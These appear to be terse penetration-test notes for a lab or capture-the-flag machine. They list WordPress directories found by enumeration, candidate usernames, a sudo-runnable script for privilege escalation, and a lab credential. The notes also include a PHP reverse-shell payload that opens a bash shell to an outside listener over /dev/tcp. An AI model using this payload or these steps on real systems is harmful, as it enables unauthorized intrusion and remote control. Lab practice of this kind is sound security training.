10.10.10.223
----------------------------
directory:
/wordpress
/wordpress/wp-content           (Status: 301) [Size: 327] [--> http://10.10.10.223/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 328] [--> http://10.10.10.223/wordpress/wp-includes/]
/wp-admin             (Status: 301) [Size: 325] [--> http://10.10.10.223/wordpress/wp-admin/]


-------------------------------
Potential username:  protagonist, neil

-----------------------------
RCE payload:
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.71/4444 0>&1'"):
------------------------------------------
can run as root: /usr/local/bin/enableSSH.sh

---------------------
User credentials:

neil: Opera2112
